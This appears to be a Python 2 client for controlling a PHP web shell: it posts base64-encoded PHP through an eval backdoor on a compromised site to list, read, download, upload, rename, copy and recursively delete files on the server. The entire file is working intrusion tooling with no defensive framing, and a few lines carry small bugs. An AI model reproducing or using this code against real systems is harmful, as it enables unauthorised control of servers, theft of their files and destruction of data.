#! /usr/bin/env python
#! -*-coding:utf-8 -*-
'''
    注意 路径必须用.replace('\\', '\\\\')转换线
'''

import os
import sys
import urllib
import urllib2
import requests
import base64
import re
from tools import *

initcode = "@eval(base64_decode($_POST[x]));&x="

class phpshell:
    sitepath = ""
    shellpass = ""
    url = ""

    def __init__(self, url, shellpass):
        code = '''
        echo dirname(__FILE__);
        '''.strip()
        self.shellpass = shellpass
        self.url = url
        data = {shellpass : code}
        html = Spider.post(url, data)
        self.sitepath =  (html+os.sep).replace('\\', '\\\\')   
        print self.sitepath
    
    #浏览文件目录
    def GetFilePath(self):
        phpcode = initcode
        filelist = re.compile(r'file:([\s\S]+?)\stime:([\s\S]+?)\ssize:(\d+?)\sperm:(\d{4})')
        code = '''@ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);echo("-|");
        ;$D=%s;$F=@opendir($D);if($F==NULL){echo("ERROR:// Path Not Found Or No Permission!");}
        else{$M=NULL;$L=NULL;while($N=@readdir($F)){$P=$D."/".$N;$T="time:".@date("Y-m-d H:i:s",@filemtime($P));
        @$E="perm:".substr(base_convert(@fileperms($P),10,8),-4);$R=" ".$T." size:".@filesize($P)." ".$E."
        ";if(@is_dir($P))$M.="file:".$N."/".$R;else $L.="file:".$N.$R;}echo $M.$L;@closedir($F);};echo("|<-");die();
        ''' % "'{0}'".format(self.sitepath).strip()  #发送的php代码
        phpcode += "{0}".format(base64.b64encode(code))
        order = Spider.oldpost(self.url, phpcode)
        if order == '-|ERROR:// Path Not Found Or No Permission!|<-':
            print "Error: Path Not Found Or No Permission!"
            return False
        else:
            printf("website path: " + self.sitepath)
            self.ShowRule(filelist.findall(order))



    #删除文件
    def DeleteFile(self, file):
        code = '''
        @ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);
        echo("-|");;function df($p){$m=@dir($p);while(@$f=$m->read()){$pf=$p."/".$f;
        if((is_dir($pf))&&($f!=".")&&($f!="..")){@chmod($pf,0777);df($pf);
        }if(is_file($pf)){@chmod($pf,0777);@unlink($pf);}}$m-close();@chmod($p,0777);
        return @rmdir($p);}$F=get_magic_quotes_gpc()?stripslashes($_POST["z1"]):$_POST["z1"];
        if(is_dir($F))echo(df($F));else{echo(file_exists($F)?@unlink($F)?"1":"0":"0");};echo("|<-");die();
        '''
        phpcode = initcode
        phpcode += "{0}&{1}".format(base64.b64encode(code), urllib.urlencode({"z1":self.sitepath + file}))
        Spider.oldpost(self.url, phpcode)


    #上传文件
    def UploadFile(self, localfile, remotepath):
        code = '''
        @ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);
        echo("-|");;$f=base64_decode($_POST["z1"]);$c=$_POST["z2"];$c=str_replace("\r","",$c);
        $c=str_replace("\n","",$c);$buf="";for($i=0;$i<strlen($c);$i+=2)$buf.=urldecode("%".substr($c,$i,2));
        echo(@fwrite(fopen($f,"wb"),$buf)?"1":"0");;echo("|<-");die();
        '''.strip()
        #注意 远程和本地都需要指定到文件名
        if remotepath == None:
            remotepath = self.sitepath
        phpcode = initcode
        phpcode += "{0}&z1={1}".format(base64.b64encode(code), base64.b64encode(remotepath))
        with open(localfile, 'rb') as file:
            data = file.read()                
        filestream = ""
        for line in range(len(data)):
            filestream += "%02x" % ord(data[line])
        phpcode += "&z2={0}".format(filestream)
        self.filesave(phpcode, 't.txt')
        result = Spider.oldpost(self.url, phpcode)
        print result

    #重命名文件 TODO 
    def RenameFile(self,oldname,newname):
        code = '''
        @ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);
        echo("-|");;$m=get_magic_quotes_gpc();
        $src=m?stripslashes($_POST["z1"]):$_POST["z1"];
        $dst=m?stripslashes($_POST["z2"]):$_POST["z2"];
        echo(rename($src,$dst)?"1":"0");
        ;echo("|<-");die();
        '''
        phpcode = initcode            
        oldname = self.sitepath+ os.sep +oldname
        newname = self.sitepath+ os.sep +newname
        phpcode += "{0}&z1={1}&z2={2}".format(base64.b64encode(code), oldname.replace('\\', '\\\\'), newname.replace('\\', '\\\\'))
        # urllib.urlencode({'z1':oldname.replace('\\', '\\\\'), 'z2':newname.replace('\\', '\\\\')})
        result = Spider.oldpost(self.url, phpcode)
        if "1" in result:
            printf("rename file ok")


    #读取文件
    def ReadFile(self, file):
        code = '''
        @ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);
        echo("\r\n");;$F=base64_decode($_POST["z1"]);$P=@fopen($F,"r");echo(@fread($P,filesize($F)));
        @fclose($P);;echo("\r\n");die();
        '''
        phpcode = initcode
        phpcode += "{0}&z1={1}".format(base64.b64encode(code), base64.b64encode(file.replace('\\', '\\\\')))
        data = Spider.oldpost(self.url, phpcode)
        print data

    #下载文件
    def DownloadFile(self, remotefile, localfile=None):
        code = '''
        @ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);
        $F=base64_decode($_POST["z1"]);$P=@fopen($F,"r");echo(@fread($P,filesize($F)));
        @fclose($P);;die();
        '''
        phpcode = initcode
        if localfile == None:
            localfile =  remotefile[remotefile.rfind("\\")+1:]
        phpcode += "{0}&z1={1}".format(base64.b64encode(code), base64.b64encode(remotefile.replace('\\', '\\\\')))
        data = Spider.oldpost(self.url, phpcode)
        self.filesave(data, localfile)
        printf("download file ok")

    #编辑文件
    def EditFile(self,remotefile):
        self.DownloadFile(remotefile, remotepath + "tmp{0}{1}".format(os.sep, 'tmp.txt'))

    #移动文件
    def CopyFile(self, sourcepath, descpath):
        if sourcepath.find('\\') <0 :
            sourcepath = self.sitepath + sourcepath
        if descpath.find('\\') < 0 :
            descpath = self.sitepath + descpath
        code = '''
        @ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);echo("-|");;
        $m=get_magic_quotes_gpc();$fc=%s;
        $fp=%s;function xcopy($src,$dest){if(is_file($src))
        {if(!copy($src,$dest))return false;else return true;}$m=@dir($src);if(!is_dir($dest))
        if(!@mkdir($dest))return false;while($f=$m->read()){$isrc=$src.chr(47).$f;$idest=$dest.chr(47).$f;
        if((is_dir($isrc))&&($f!=chr(46))&&($f!=chr(46).chr(46))){if(!xcopy($isrc,$idest))return false;}
        else if(is_file($isrc)){if(!copy($isrc,$idest))return false;}}return true;}echo(xcopy($fc,$fp)?"1":"0");
        ;echo("|<-");die();
        ''' % (sourcepath, descpath)
        phpcode = initcode
        phpcode += "{0}".format(base64.b64encode(code))
        self.filesave2(phpcode)
        data = {self.shellpass:phpcode}
        result = Spider.post(self.url, data)
        print result
        if "-|1|<-" in result:
            printf("copy file ok")

    def ShowRule(self, list):
        string = "total: {0}\nperm\t\tsize\t\tdate\t\tfile\n".format(len(list))
        for line in list:
            string += "{0}".format(self.showrwx(line[3][1]) + self.showrwx(line[3][2]) + self.showrwx(line[3][3]))
            string += "\t{0}".format(line[2])
            string += "\t{0}".format(line[1])
            string += "\t{0}\n".format(line[0])
        print string

    def showrwx(self, num):
        permx = {1:'--x', 2:'-w-', 4:'r--', 7:"rwx"}
        if num in permx.keys():
            return permx[num]
        elif num == 3 :
            return "-wx"
        elif num == 5:
            return "r-x"
        elif num == 6:
            return "rw-"
        else:
            return "rwx"
        return string

    def filesave(self, data, name):
        with open(name, 'wb') as file:
            file.write(data)

    def filesave2(self, data):
        with open("test.txt", 'wb') as file:
            file.write(data)
    
    
    